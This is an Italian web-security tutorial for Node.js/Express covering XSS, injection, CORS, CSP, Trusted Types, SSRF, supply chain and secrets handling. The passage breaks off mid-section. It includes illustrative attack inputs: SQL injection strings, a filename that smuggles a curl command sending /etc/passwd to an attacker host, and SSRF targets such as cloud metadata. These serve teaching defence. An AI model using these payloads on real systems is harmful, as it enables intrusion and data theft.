# Tutorial 14 — Sicurezza Web: Dal Principiante all'Esperto

> **Companion a:** `14-sicurezza-web.md`
> **Scope:** modello di sicurezza del browser, XSS e le sue difese, injection, CORS, HTTPS e header di sicurezza, Content Security Policy con nonce, Trusted Types, Fetch Metadata, caricamento file, SSRF, supply chain, gestione dei segreti, esposizione dei dati, audit e risposta all'incidente
> **Prerequisiti:** `tutorial_13_autenticazione_autorizzazione.md` — sessioni, token e CSRF; `tutorial_12_database_web.md` — query parametrizzate; `tutorial_10_nodejs.md` — middleware
> **Durata stimata:** 8-10 ore di studio + esercizi
> **Lingua:** Italiano — termini tecnici in inglese preservati
> **Stack:** Node.js LTS · Express 5 · helmet · OWASP Top 10 2021 · CSP Level 3

---

## Indice Generale

- [Mappa concettuale](#mappa-concettuale)
- **[Parte A — Basi Assolute](#parte-a--basi-assolute)**
  - [A1. Il modello di sicurezza del browser](#a1-il-modello-di-sicurezza-del-browser)
  - [A2. XSS: i tre tipi, e la difesa che funziona](#a2-xss-i-tre-tipi-e-la-difesa-che-funziona)
  - [A3. Injection: SQL, comandi, template](#a3-injection-sql-comandi-template)
  - [A4. CORS: cosa fa, e cosa non fa](#a4-cors-cosa-fa-e-cosa-non-fa)
  - [A5. HTTPS e gli header che servono davvero](#a5-https-e-gli-header-che-servono-davvero)
- **[Parte B — Comprensione Profonda](#parte-b--comprensione-profonda)**
  - [B1. Content Security Policy: da zero a una policy che regge](#b1-content-security-policy-da-zero-a-una-policy-che-regge)
  - [B2. Trusted Types e le sink pericolose](#b2-trusted-types-e-le-sink-pericolose)
  - [B3. Fetch Metadata: la difesa che nessuno usa](#b3-fetch-metadata-la-difesa-che-nessuno-usa)
  - [B4. Caricamento di file](#b4-caricamento-di-file)
  - [B5. SSRF: quando il server diventa il tuo proxy](#b5-ssrf-quando-il-server-diventa-il-tuo-proxy)
  - [B6. Supply chain: il codice che non hai scritto](#b6-supply-chain-il-codice-che-non-hai-scritto)
  - [B7. I segreti: dove non vanno mai](#b7-i-segreti-dove-non-vanno-mai)
  - [B8. Esposizione dei dati e mass assignment](#b8-esposizione-dei-dati-e-mass-assignment)
  - [B9. Difesa in profondità: progettare per il fallimento](#b9-difesa-in-profondità-progettare-per-il-fallimento)
- **[Parte C — Esercizi Pratici Guidati](#parte-c--esercizi-pratici-guidati)**
  - [C1. Esercizi progressivi con soluzione](#c1-esercizi-progressivi-con-soluzione)
  - [C2. Mini-progetto: audit di sicurezza con contromisure](#c2-mini-progetto-audit-di-sicurezza-con-contromisure)
- **[Parte D — Approfondimento per Esperti](#parte-d--approfondimento-per-esperti)**
  - [D1. Un modello di minaccia proporzionato](#d1-un-modello-di-minaccia-proporzionato)
  - [D2. Cifratura a riposo e gestione delle chiavi](#d2-cifratura-a-riposo-e-gestione-delle-chiavi)
  - [D3. Sicurezza della pipeline](#d3-sicurezza-della-pipeline)
  - [D4. Divulgazione responsabile](#d4-divulgazione-responsabile)
  - [D5. Quando succede: la risposta all'incidente](#d5-quando-succede-la-risposta-allincidente)
- **[Parte E — Riepilogo, Checklist e Prossimi Passi](#parte-e--riepilogo-checklist-e-prossimi-passi)**

---

## Mappa concettuale

```
   BROWSER                                    SERVER
   ┌───────────────────────────┐   HTTPS   ┌──────────────────────┐
   │ same-origin policy        │◄─────────►│ validazione ingresso │
   │ CSP · Trusted Types       │   HSTS    │ query parametrizzate │
   │ cookie HttpOnly/SameSite  │           │ autorizzazione       │
   │ Subresource Integrity     │           │ limite di frequenza  │
   └───────────────────────────┘           └──────────┬───────────┘
                                                      ▼
                                            ┌──────────────────────┐
                                            │ segreti fuori dal    │
                                            │ codice · cifratura   │
                                            │ a riposo · log senza │
                                            │ dati sensibili       │
                                            └──────────────────────┘

   LE CINQUE DOMANDE DI OGNI REVISIONE DI SICUREZZA
     1. da dove entra un dato che non controllo?
     2. dove finisce quel dato — HTML, SQL, shell, URL, file?
     3. chi può chiamare questo endpoint, e su QUALE risorsa?
     4. cosa succede se questa difesa cade?
     5. me ne accorgerei?

   LA REGOLA CHE STA SOTTO A TUTTO
     Non esiste "input sicuro": esiste input CODIFICATO PER LA
     DESTINAZIONE. Lo stesso testo è innocuo in un attributo HTML,
     pericoloso in un URL e catastrofico in una shell.
```

---

# Parte A — Basi Assolute

---

## A1. Il modello di sicurezza del browser

> **Analogia:** un condominio in cui ogni appartamento ha la sua serratura. Puoi bussare alla porta del vicino e lasciargli un biglietto (inviare una richiesta), ma non puoi entrare a guardare cosa c'è dentro (leggere la risposta). Quasi tutta la sicurezza del web è questa distinzione — e quasi tutti gli attacchi consistono nel farsi aprire la porta da chi ci abita.

```
LA SAME-ORIGIN POLICY: un'origine è la terna
    SCHEMA + HOST + PORTA
  https://esempio.it        e  http://esempio.it        → diverse (schema)
  https://esempio.it        e  https://api.esempio.it   → diverse (host)
  https://esempio.it        e  https://esempio.it:8443  → diverse (porta)
  https://esempio.it/a      e  https://esempio.it/b     → STESSA

Uno script di un'origine NON può leggere le risposte di un'altra,
né il DOM di un iframe di un'altra origine, né i suoi cookie.

⚠ MA PUÒ MANDARE RICHIESTE. È esattamente ciò che rende possibile il
  CSRF: la richiesta parte, il browser allega i cookie, e la risposta
  l'attaccante non la legge — ma l'effetto è già avvenuto.
```

```
COSA NON È COPERTO DALLA SAME-ORIGIN POLICY, ED È IL PUNTO
  · i tag <script>, <img>, <link>, <iframe> caricano da qualunque
    origine: è così che funziona il web, ed è la superficie della
    supply chain nel browser
  · uno script caricato da un'altra origine gira con i PRIVILEGI
    DELLA TUA PAGINA. Non è "codice di terzi in una sandbox": è il
    tuo codice, scritto da qualcun altro.
  · i sottodomini condividono i cookie se il dominio del cookie è il
    dominio padre: un sottodominio compromesso legge le sessioni
```

---

## A2. XSS: i tre tipi, e la difesa che funziona

Il Cross-Site Scripting è l'esecuzione di codice scelto dall'attaccante *dentro la tua origine*. Da lì può leggere il DOM, i token in `localStorage`, inviare richieste autenticate: tutto ciò che può fare la tua pagina.

```
I TRE TIPI
  RIFLESSO   il dato arriva nella richiesta e torna nella risposta.
    https://sito.it/cerca?q=<script>… — serve convincere la vittima
    ad aprire il link.
  PERSISTENTE  il dato viene SALVATO e mostrato a tutti gli altri.
    Un commento, un nome utente, il campo "azienda" di un profilo.
    È il più grave: colpisce chiunque apra la pagina.
  BASATO SUL DOM  il server non c'entra: è il JavaScript della
    pagina che prende un valore da location, da un messaggio o da
    una API e lo scrive in una sink pericolosa.
```

```javascript
// ❌ LE QUATTRO SINK CHE TRASFORMANO UNA STRINGA IN CODICE
elemento.innerHTML = datoUtente
elemento.outerHTML = datoUtente
document.write(datoUtente)
eval(datoUtente)

// ⚠ E QUELLE MENO OVVIE
elemento.setAttribute('href', datoUtente)   // javascript:alert(1)
elemento.setAttribute('onclick', datoUtente)
nuovaFinestra.location = datoUtente
```

```javascript
// ✅ LA DIFESA NON È "FILTRARE I CARATTERI PERICOLOSI": è usare
//    l'API che tratta il dato come DATO e non come markup

// Testo: textContent non interpreta mai nulla
elemento.textContent = datoUtente

// Attributi: setAttribute con un nome NOTO, mai costruito dal dato
elemento.setAttribute('title', datoUtente)

// URL: si valida lo SCHEMA prima di usarlo
function urlSicuro(grezzo) {
  try {
    const url = new URL(grezzo, window.location.origin)
    // javascript:, data:, vbscript: eseguono codice
    return ['http:', 'https:', 'mailto:'].includes(url.protocol) ? url.href : '#'
  } catch {
    return '#'
  }
}

// HTML che DEVE restare HTML (un testo formattato dall'utente):
// si sanifica con una libreria mantenuta, mai con una regex
// import DOMPurify from 'dompurify'
// elemento.innerHTML = DOMPurify.sanitize(html, { USE_PROFILES: { html: true } })
```

```
PERCHÉ LE REGEX NON FUNZIONANO  il parser HTML dei browser è
  tollerante per progetto: accetta tag non chiusi, attributi senza
  virgolette, maiuscole miste, entità, caratteri di controllo. Ogni
  filtro fatto a mano ha una forma che non ha previsto, e la lista
  delle forme si allunga ogni anno. Sanificare è un problema che si
  delega a chi lo mantiene.

I FRAMEWORK MODERNI FANNO L'ESCAPING PER DEFAULT — e hanno tutti una
via d'uscita, che è dove nasce l'XSS:
  React    dangerouslySetInnerHTML
  Vue      v-html
  Svelte   {@html …}
  Angular  bypassSecurityTrustHtml
Cercare queste quattro stringhe nel repository è il primo passo di
qualunque audit, e spesso il più produttivo.
```

---

## A3. Injection: SQL, comandi, template

> **Analogia:** dettare un indirizzo al telefono. Se dici «via Roma dodici — anzi no, cancella tutto e scrivi via Milano», chi trascrive non sa distinguere l'indirizzo dall'istruzione. L'injection è sempre questo: un dato che il destinatario interpreta come comando.

```typescript
// ❌ SQL INJECTION — la concatenazione
// const q = `SELECT * FROM utenti WHERE email = '${email}'`
//   email = "' OR '1'='1"  → restituisce tutti gli utenti
//   email = "'; DROP TABLE utenti; --"  → il resto è cronaca

// ✅ Query parametrizzata: il valore non viene MAI analizzato come SQL
import { db, sql } from './database.js'

export async function trovaPerEmail(email: string) {
  return db.utente.findUnique({ where: { email } })
  // oppure, in SQL diretto:  sql`SELECT * FROM utenti WHERE email = ${email}`
}
```

```
⚠ I PARAMETRI PROTEGGONO I VALORI, NON LA STRUTTURA. Nomi di
  colonna, di tabella, direzioni di ordinamento e LIMIT non possono
  essere parametri: vanno risolti con una MAPPA a chiavi note.
  È lo stesso principio di tutorial_11 §B3 e tutorial_12 §B3.
```

```typescript
// ❌ COMMAND INJECTION — la più distruttiva, e la più facile da evitare
// import { exec } from 'node:child_process'
// exec(`convert ${nomeFile} output.png`)
//   nomeFile = "a.jpg; curl attaccante.example/$(cat /etc/passwd)"

// ✅ execFile: gli argomenti sono un ARRAY, non una riga di shell.
//    Nessuna shell li interpreta, quindi ; | $() ` non significano nulla.
import { execFile } from 'node:child_process'
import { promisify } from 'node:util'

const eseguiFile = promisify(execFile)

export async function converti(percorsoOrigine: string, percorsoDestinazione: string) {
  // Il percorso va comunque validato: non è injection, è traversal
  return eseguiFile('convert', [percorsoOrigine, percorsoDestinazione], { timeout: 30_000 })
}
```

```
LE ALTRE INJECTION CHE SI INCONTRANO
  NoSQL  { email: { $ne: null } } inviato dove il codice si aspetta
    una stringa: MongoDB lo interpreta come operatore. → validare il
    TIPO con Zod prima di passarlo alla query.
  TEMPLATE  un motore di template che valuta espressioni (SSTI):
    mai costruire il TEMPLATE da un dato utente, solo i suoi VALORI.
  LDAP, XPath, log  stesso principio: il dato entra in un linguaggio.
  HEADER  un \r\n in un valore di header spezza la risposta HTTP.
    Node lo rifiuta, ma un proxy scritto a mano no.

LA REGOLA UNICA: non esiste "input pulito". Esiste input CODIFICATO
PER LA DESTINAZIONE, e la destinazione va conosciuta nel punto in cui
si scrive la riga.
```

---

## A4. CORS: cosa fa, e cosa non fa

```
CORS NON È UNA DIFESA DEL TUO SERVER. È un modo di ALLENTARE la
same-origin policy del BROWSER, in modo controllato.

  · non protegge da curl, da un altro server, da un'app mobile
  · non protegge dal CSRF (il modulo cross-site parte lo stesso)
  · protegge gli UTENTI di altri siti dal fatto che quei siti
    leggano le tue risposte usando i loro cookie

Detto altrimenti: CORS decide chi può LEGGERE la risposta, non chi
può fare la richiesta.
```

```typescript
// ❌ I DUE ERRORI CHE ANNULLANO LA PROTEZIONE
// 1. riflettere l'origine ricevuta = permettere tutto
// risposta.setHeader('Access-Control-Allow-Origin', richiesta.get('Origin'))
// 2. '*' insieme alle credenziali: i browser lo rifiutano, e chi lo
//    "risolve" riflettendo l'origine ricade nel caso 1

// ✅ Una lista chiusa, e le credenziali solo dove servono
import cors from 'cors'

const ORIGINI_AMMESSE = new Set([
  'https://app.esempio.it',
  'https://admin.esempio.it',
])

export const corsConfigurato = cors({
  origin(origine, callback) {
    // Nessuna origine = richiesta non da browser (curl, server): la
    // si lascia passare, perché CORS non la riguarda
    if (!origine) return callback(null, true)
    callback(null, ORIGINI_AMMESSE.has(origine))
  },
  credentials: true,
  methods: ['GET', 'POST', 'PATCH', 'DELETE'],
  allowedHeaders: ['Content-Type', 'Authorization', 'Idempotency-Key'],
  // Gli header che il client può LEGGERE dalla risposta
  exposedHeaders: ['X-Request-Id', 'RateLimit'],
  maxAge: 86_400, // il preflight si mette in cache per un giorno
})
```

```
IL PREFLIGHT: prima di una richiesta "non semplice" il browser manda
una OPTIONS per chiedere il permesso. È non semplice se il metodo non
è GET/HEAD/POST, se il Content-Type non è fra i tre ammessi
(form-urlencoded, multipart, text/plain), o se ci sono header
personalizzati — cioè quasi sempre, con un'API JSON autenticata.
⚠ Un preflight senza `maxAge` raddoppia le richieste di rete.
```

---

## A5. HTTPS e gli header che servono davvero

```
HTTPS NON È FACOLTATIVO, e non per il "lucchetto":
  · senza, chiunque sulla stessa rete legge cookie e token
  · senza, un proxy può MODIFICARE la pagina in transito e
    iniettare script
  · senza, non funzionano service worker, geolocalizzazione,
    WebAuthn, HTTP/2 e quasi tutte le API moderne
```

```typescript
// Gli header di sicurezza. `helmet` ne imposta un insieme
// ragionevole; questi sono quelli che vale la pena conoscere uno
// per uno, perché i valori predefiniti non vanno bene per tutti.
import helmet from 'helmet'
import type { Express } from 'express'

export function applicaHeaderSicurezza(app: Express): void {
  app.use(
    helmet({
      // HSTS: il browser userà HTTPS anche se l'utente digita http://
      // ⚠ Una volta inviato, vale per `maxAge` secondi: se il
      //    certificato scade e il sito torna in HTTP, è irraggiungibile.
      //    `preload` è quasi irreversibile: si entra in una lista
      //    compilata nei browser, e uscirne richiede mesi.
      hsts: { maxAge: 31_536_000, includeSubDomains: true, preload: false },

      // Impedisce che la tua pagina sia messa in un iframe altrui
      // (clickjacking). CSP frame-ancestors è il successore.
      frameguard: { action: 'deny' },

      // Il browser non "indovina" il tipo: un file caricato come
      // testo non viene eseguito come script
      noSniff: true,

      // Non inviare l'URL completo ai siti esterni: gli URL
      // contengono spesso identificativi e token
      referrerPolicy: { policy: 'strict-origin-when-cross-origin' },

      // La CSP merita una sezione a sé: vedi B1
      contentSecurityPolicy: false,
    }),
  )

  // Disattiva le API del browser che non usi
  app.use((_richiesta, risposta, prossimo) => {
    risposta.setHeader('Permissions-Policy', 'geolocation=(), camera=(), microphone=()')
    prossimo()
  })
}
```

```
GLI HEADER, IN ORDINE DI VALORE
  Content-Security-Policy       la difesa più efficace contro l'XSS
  Strict-Transport-Security     forza HTTPS
  X-Content-Type-Options        nosniff
  Referrer-Policy               non far uscire gli URL
  Permissions-Policy            spegne le API non usate
  Cross-Origin-Opener-Policy    isola la tua finestra da chi la apre
  Cross-Origin-Resource-Policy  impedisce l'inclusione da altre origini

⚠ X-XSS-Protection è DEPRECATO e va rimosso: il filtro dei browser
  vecchi introduceva vulnerabilità proprie, ed è stato eliminato.
```

---

# Parte B — Comprensione Profonda

---

## B1. Content Security Policy: da zero a una policy che regge

> **Analogia:** la lista degli ospiti all'ingresso. Non impedisce che qualcuno provi a entrare: impedisce che entri chi non è in lista. Una CSP non toglie il bug che permette l'iniezione — toglie all'attaccante la possibilità di *eseguire* qualcosa una volta entrato.

```
❌ LA CSP CHE NON PROTEGGE (e che si trova ovunque)
   script-src 'self' 'unsafe-inline' https://cdn.example
   · 'unsafe-inline' annulla l'intera protezione contro l'XSS:
     qualunque <script> iniettato viene eseguito
   · un dominio in lista è un dominio di cui ti fidi COMPLETAMENTE:
     se ospita anche un solo file JSONP o una libreria con un
     bypass noto, la lista è aggirata
```

```typescript
// ✅ La CSP basata su NONCE: solo gli script che portano il nonce
//    generato per QUESTA risposta vengono eseguiti
import { randomBytes } from 'node:crypto'
import type { RequestHandler } from 'express'

export const cspConNonce: RequestHandler = (_richiesta, risposta, prossimo) => {
  // Un nonce nuovo a OGNI risposta: riusarlo lo rende inutile
  const nonce = randomBytes(16).toString('base64')
  risposta.locals['nonce'] = nonce

  risposta.setHeader(
    'Content-Security-Policy',
    [
      `default-src 'self'`,
      // strict-dynamic: uno script fidato può caricarne altri, e la
      // lista di domini viene IGNORATA dai browser che lo supportano
      `script-src 'nonce-${nonce}' 'strict-dynamic' https: 'unsafe-inline'`,
      `style-src 'self' 'nonce-${nonce}'`,
      `img-src 'self' data: https:`,
      `connect-src 'self' https://api.esempio.it`,
      `font-src 'self'`,
      // Nessun plugin, nessuna base injection, nessun form altrove
      `object-src 'none'`,
      `base-uri 'none'`,
      `form-action 'self'`,
      // Il successore di X-Frame-Options
      `frame-ancestors 'none'`,
      `upgrade-insecure-requests`,
      `report-uri /api/csp-report`,
    ].join('; '),
  )

  prossimo()
}
```

```
PERCHÉ QUELLA RIGA CONTIENE 'unsafe-inline' E VA BENE
  I browser che capiscono i nonce IGNORANO 'unsafe-inline' quando è
  presente un nonce; quelli vecchi ignorano il nonce e usano
  'unsafe-inline'. È una degradazione voluta: i browser moderni sono
  protetti, i vecchi non stanno peggio di prima. Lo stesso vale per
  `https:` accanto a 'strict-dynamic'.

IL PERCORSO DI ADOZIONE, CHE È LA PARTE DIFFICILE
  1. Content-Security-Policy-REPORT-ONLY in produzione: non blocca
     nulla e invia i report. Si lascia una o due settimane.
  2. Si legge cosa violerebbe: quasi sempre saltano fuori script
     inline dimenticati, strumenti di analisi, estensioni.
  3. Si correggono i propri, si aggiungono i legittimi.
  4. Si passa all'enforcement, tenendo il report-only per la
     versione più stretta successiva.
  ⚠ Passare direttamente all'enforcement rompe il sito, e la
    reazione tipica è rimuovere la CSP invece di correggerla.
```

```typescript
// L'endpoint dei report. ⚠ Va limitato in frequenza: è pubblico, e
// una CSP su un sito trafficato genera molti report — incluse le
// violazioni causate dalle estensioni del browser, che sono rumore.
app.post('/api/csp-report', express.json({ type: ['application/csp-report', 'application/json'] }),
  (richiesta, risposta) => {
    const rapporto = (richiesta.body as { 'csp-report'?: Record<string, unknown> })['csp-report']
    registro.warn({ csp: rapporto }, 'violazione CSP')
    risposta.status(204).end()
  },
)
```

---

## B2. Trusted Types e le sink pericolose

```
La CSP con nonce blocca gli script ESTERNI e quelli inline non
autorizzati. Non blocca l'XSS BASATO SUL DOM: se il tuo codice
scrive `elemento.innerHTML = datoNonFidato`, quello è codice tuo, e
il nonce non c'entra.

Trusted Types chiude proprio questo: rende le sink pericolose
inutilizzabili con una stringa qualunque.
```

```javascript
// Con Content-Security-Policy: require-trusted-types-for 'script'
elemento.innerHTML = '<b>ciao</b>'
// → TypeError: this document requires 'TrustedHTML' assignment

// Il codice deve passare per una POLICY dichiarata, ed è lì che si
// concentra la sanificazione: un solo punto da rivedere, invece di
// ogni assegnazione sparsa nel codice
const policy = trustedTypes.createPolicy('sanificaHtml', {
  createHTML: (grezzo) => DOMPurify.sanitize(grezzo, { RETURN_TRUSTED_TYPE: false }),
})

elemento.innerHTML = policy.createHTML(htmlUtente)
```

```
IL VALORE VERO DI TRUSTED TYPES non è la sanificazione — quella si
poteva fare comunque. È che rende l'assegnazione non sanificata un
ERRORE DI ESECUZIONE invece di un bug silenzioso: si scopre in
sviluppo, non da un report di sicurezza.

  Adozione: `require-trusted-types-for 'script'` in report-only,
  si raccolgono le violazioni, si convertono le sink una per una.
  Supporto: Chrome ed Edge; Firefox e Safari lo ignorano, quindi
  resta una difesa parziale — utile, non sufficiente.
```

---

## B3. Fetch Metadata: la difesa che nessuno usa

Il CSRF e le sue difese classiche sono in `tutorial_13_autenticazione_autorizzazione.md` §A4. Qui interessa la difesa più recente, che copre anche casi che il token anti-CSRF non copre.

```
I BROWSER MODERNI INVIANO DA SOLI TRE HEADER CHE DICONO DA DOVE
ARRIVA LA RICHIESTA — e il JavaScript non può falsificarli.

  Sec-Fetch-Site  same-origin · same-site · cross-site · none
  Sec-Fetch-Mode  navigate · cors · no-cors · same-origin
  Sec-Fetch-Dest  document · script · image · empty · …

Una richiesta cross-site con Mode: no-cors verso un endpoint di API
non ha nessuna ragione legittima di esistere: è un tag <img> o un
<form> che punta alla tua API.
```

```typescript
// Un solo middleware che blocca un'intera classe di attacchi:
// CSRF, alcune forme di clickjacking e l'inclusione come risorsa
import type { RequestHandler } from 'express'

const DESTINAZIONI_NAVIGAZIONE = new Set(['document', 'iframe'])

export const isolamentoRisorse: RequestHandler = (richiesta, risposta, prossimo) => {
  const sito = richiesta.get('Sec-Fetch-Site')

  // I browser vecchi non li inviano: si lascia passare, perché
  // bloccare romperebbe quei client. È una difesa AGGIUNTIVA.
  if (!sito) return prossimo()

  if (sito === 'same-origin' || sito === 'same-site' || sito === 'none') {
    return prossimo()
  }

  const modo = richiesta.get('Sec-Fetch-Mode')
  const destinazione = richiesta.get('Sec-Fetch-Dest') ?? ''

  // Cross-site è legittimo solo per una NAVIGAZIONE con GET: un
  // link che porta al tuo sito da un altro sito
  if (modo === 'navigate' && richiesta.method === 'GET' && DESTINAZIONI_NAVIGAZIONE.has(destinazione)) {
    return prossimo()
  }

  registro.warn({ sito, modo, destinazione, percorso: richiesta.path }, 'richiesta cross-site bloccata')
  risposta.status(403).json({ errore: 'Richiesta cross-site non consentita' })
}
```

```
⚠ VA MESSO PRIMA DELLE ROTTE MA DOPO CORS: se la tua API è
  volutamente chiamata da un'altra origine, quel traffico è
  cross-site e verrebbe bloccato. La regola: applicalo alle rotte
  che servono solo il TUO frontend, non a un'API pubblica.
```

---

## B4. Caricamento di file

```
UN CARICAMENTO DI FILE È QUATTRO PROBLEMI IN UNO
  1. il CONTENUTO può essere eseguibile (una web shell)
  2. il NOME può contenere un percorso (../../etc/passwd)
  3. la DIMENSIONE può esaurire disco o memoria
  4. il TIPO dichiarato dal client è una bugia fino a prova contraria
```

```typescript
import { fileTypeFromBuffer } from 'file-type'
import { randomUUID } from 'node:crypto'
import path from 'node:path'

const TIPI_AMMESSI = new Map([
  ['image/jpeg', '.jpg'],
  ['image/png', '.png'],
  ['image/webp', '.webp'],
  ['application/pdf', '.pdf'],
])

export async function accettaFile(contenuto: Buffer, nomeOriginale: string) {
  if (contenuto.byteLength > 5 * 1024 * 1024) {
    throw new ErroreValidazione([{ percorso: 'file', messaggio: 'oltre 5 MB' }])
  }

  // Il tipo si determina dai BYTE INIZIALI, non dall'estensione né
  // dall'header Content-Type: entrambi li sceglie il client
  const rilevato = await fileTypeFromBuffer(contenuto)
  if (!rilevato || !TIPI_AMMESSI.has(rilevato.mime)) {
    throw new ErroreValidazione([{ percorso: 'file', messaggio: 'tipo non ammesso' }])
  }

  // Il nome si GENERA: non si sanifica quello ricevuto. Sanificare
  // è un elenco di casi da prevedere; generare è una garanzia.
  const nome = `${randomUUID()}${TIPI_AMMESSI.get(rilevato.mime)}`

  // Il nome originale si conserva come METADATO, per mostrarlo,
  // mai come percorso
  return { nome, nomeVisualizzato: path.basename(nomeOriginale).slice(0, 200), mime: rilevato.mime }
}
```

```
LE QUATTRO REGOLE DEL SERVIZIO DEI FILE CARICATI
  1. SU UN'ORIGINE DIVERSA (un dominio dedicato o un bucket). Un
     file servito dalla tua origine, se eseguito, ha i privilegi
     della tua pagina — nonce e CSP compresi.
  2. Content-Type ESPLICITO + `X-Content-Type-Options: nosniff` +
     `Content-Disposition: attachment` per i tipi non visualizzabili.
  3. MAI IN UNA CARTELLA ESEGUIBILE dal server web.
  4. AUTORIZZAZIONE ANCHE SUL DOWNLOAD: un URL non indovinabile non
     è un controllo di accesso. Se il file è riservato, il link
     firmato ha una scadenza.

⚠ UN'IMMAGINE PUÒ CONTENERE CODICE: un file valido come JPEG può
  avere HTML nei metadati. Se lo servi con il Content-Type giusto e
  nosniff, non viene eseguito — ma se lo rielabori con una libreria
  vulnerabile (ImageMagick ha avuto più di un caso), il codice gira
  sul tuo server. Rielabora sempre in un processo isolato e con
  limiti di tempo e memoria.
```

---

## B5. SSRF: quando il server diventa il tuo proxy

> **Analogia:** chiedere al portiere di andare a ritirare un pacco a un indirizzo che scegli tu. Il portiere ha le chiavi di tutti i locali dell'edificio: se gli indichi la porta della cassaforte, ci va — perché è il suo lavoro andare dove gli si dice.

```
UNA FUNZIONE CHE SCARICA UN URL FORNITO DALL'UTENTE (anteprima di
un link, importazione da URL, webhook configurabile) permette a chi
la usa di raggiungere ciò che il SERVER raggiunge:
  http://localhost:6379          Redis senza password
  http://169.254.169.254/…       le credenziali del cloud
  http://10.0.0.5/admin          il pannello interno
  file:///etc/passwd             il filesystem locale
```

```typescript
import { lookup } from 'node:dns/promises'
import { isIP } from 'node:net'

const SCHEMI_AMMESSI = new Set(['http:', 'https:'])

function indirizzoPrivato(ip: string): boolean {
  if (isIP(ip) === 4) {
    const [a, b] = ip.split('.').map(Number)
    return (
      a === 10 || a === 127 || a === 0 ||
      (a === 172 && b! >= 16 && b! <= 31) ||
      (a === 192 && b === 168) ||
      (a === 169 && b === 254) // metadati del cloud
    )
  }
  // IPv6: loopback, link-local, unique local
  return /^(::1|fe80:|fc|fd)/i.test(ip)
}

export async function risolviUrlEsterno(grezzo: string): Promise<{ url: URL; ip: string }> {
  const url = new URL(grezzo)

  if (!SCHEMI_AMMESSI.has(url.protocol)) throw new Error('schema non ammesso')

  const { address } = await lookup(url.hostname)
  if (indirizzoPrivato(address)) throw new Error('indirizzo interno non raggiungibile')

  return { url, ip: address }
}
```

```
⚠ IL DIFETTO CHE RESTA: fra la risoluzione DNS e la connessione, un
  attaccante può cambiare il record (DNS rebinding) e far puntare lo
  stesso nome a 127.0.0.1. Le difese vere:
   · connettersi all'IP VERIFICATO, passando il nome nell'header Host
   · rifiutare i redirect, o rivalidare ogni destinazione
   · e soprattutto: un PROXY DEDICATO in una rete che non ha accesso
     ai servizi interni. È l'unica difesa che non dipende dal codice.

LE ALTRE MISURE  timeout breve · limite alla dimensione della
  risposta · niente credenziali automatiche verso l'esterno · e non
  restituire il corpo della risposta all'utente (altrimenti la SSRF
  diventa anche una lettura).
```

---

## B6. Supply chain: il codice che non hai scritto

```
Un'applicazione moderna ha centinaia di dipendenze transitive. Ognuna
esegue codice CON I TUOI PRIVILEGI: nel browser, dentro la tua
origine; sul server, con l'utente del processo; in CI, con i token
di deploy.

IL VETTORE PRINCIPALE È `postinstall`: un pacchetto compromesso
esegue codice arbitrario al momento dell'INSTALLAZIONE — sulla tua
macchina e nella pipeline, dove ci sono i segreti.
```

```
# .npmrc — le due righe che chiudono la superficie principale
enable-pre-post-scripts=false
# Solo pacchetti pubblicati da almeno tre giorni: è la finestra in
# cui i pacchetti compromessi vengono tipicamente rimossi
minimum-release-age=4320
```

```yaml
# pnpm-workspace.yaml — l'elenco chiuso di chi PUÒ eseguire script
# (servono a compilare binari nativi)
onlyBuiltDependencies:
  - esbuild
  - sharp
  - '@prisma/engines'
```

```
LE ALTRE DIFESE, IN ORDINE DI RESA
  · lockfile committato e `--frozen-lockfile` in CI: senza, la build
    di oggi non è quella di ieri
  · `pnpm audit --audit-level high` in CI, e una verifica SETTIMANALE
    a calendario: le vulnerabilità escono anche quando il codice non
    cambia
  · Dependabot o Renovate con aggiornamento automatico delle patch
  · SBOM (CycloneDX) generato a ogni rilascio: quando esce una
    vulnerabilità, la domanda "ce l'abbiamo?" ha una risposta in un
    minuto invece che in un giorno
  · nel BROWSER: Subresource Integrity su ogni script da CDN
    <script src="…" integrity="sha384-…" crossorigin="anonymous">
    Se il file cambia, il browser lo rifiuta. ⚠ Non funziona con le
    CDN che servono contenuto variabile: quelle vanno auto-ospitate.
  · valutare il numero di dipendenze come un COSTO: ogni pacchetto è
    una superficie, e "è solo una utility di sedici righe" è il modo
    in cui si arriva a milleduecento dipendenze transitive.
```

---

## B7. I segreti: dove non vanno mai

```
❌ NEL CODICE  finisce nel repository, e nella CRONOLOGIA git anche
   dopo la rimozione. Un segreto committato va considerato
   compromesso: si RUOTA, non si cancella e basta.
❌ NEL BUNDLE DEL FRONTEND  qualunque cosa arrivi al browser è
   pubblica. Le variabili con prefisso VITE_ o NEXT_PUBLIC_ sono una
   DICHIARAZIONE che il valore è pubblico, non una protezione.
❌ NEI LOG  ci restano per il periodo di conservazione, e i log
   spesso finiscono in servizi di terzi.
❌ NELLE IMMAGINI DOCKER  un ARG resta negli strati dell'immagine e
   si legge con `docker history`.
❌ NEGLI URL  finiscono nella cronologia, nei log dei proxy e
   nell'header Referer verso i siti esterni.
```

```typescript
// ✅ Variabili d'ambiente, validate all'AVVIO: fallire subito è
//    meglio che fallire alla prima richiesta in produzione
import { z } from 'zod'

const SchemaAmbiente = z.object({
  DATABASE_URL: z.string().url(),
  // Una lunghezza minima esplicita: un segreto di otto caratteri
  // passa un controllo di presenza e non protegge nulla
  JWT_SECRET: z.string().min(32),
  REDIS_URL: z.string().url(),
})

const esito = SchemaAmbiente.safeParse(process.env)

if (!esito.success) {
  // ⚠ Si stampano i NOMI mancanti, mai i valori presenti
  console.error('Configurazione non valida:', esito.error.issues.map((i) => i.path.join('.')))
  process.exit(1)
}

export const configurazione = esito.data
```

```
COME SI GESTISCONO DAVVERO
  · in sviluppo: `.env` in `.gitignore`, e un `.env.example` con i
    NOMI e valori finti, committato
  · in produzione: il gestore di segreti della piattaforma (Vault,
    AWS Secrets Manager, i secret di GitHub Actions)
  · rotazione periodica, e rotazione IMMEDIATA quando qualcuno lascia
    il team o un segreto compare in un log
  · scansione automatica in CI (gitleaks, trufflehog) e un hook
    pre-commit: intercettare prima è mille volte più economico
```

---

## B8. Esposizione dei dati e mass assignment

```typescript
// ❌ RESTITUIRE L'OGGETTO INTERO: passwordHash, segreto TOTP, note
//    interne, tutto finisce nella risposta. È la vulnerabilità più
//    banale e una delle più frequenti.
// risposta.json(await db.utente.findUnique({ where: { id } }))

// ✅ La selezione esplicita, sul livello dati: così non dipende da
//    chi scrive l'handler
export async function profiloPubblico(id: bigint) {
  return db.utente.findUnique({
    where: { id },
    select: { id: true, nome: true, avatarUrl: true, creatoIl: true },
  })
}
```

```typescript
// ❌ MASS ASSIGNMENT: il corpo della richiesta passa direttamente
//    all'aggiornamento
// await db.utente.update({ where: { id }, data: richiesta.body })
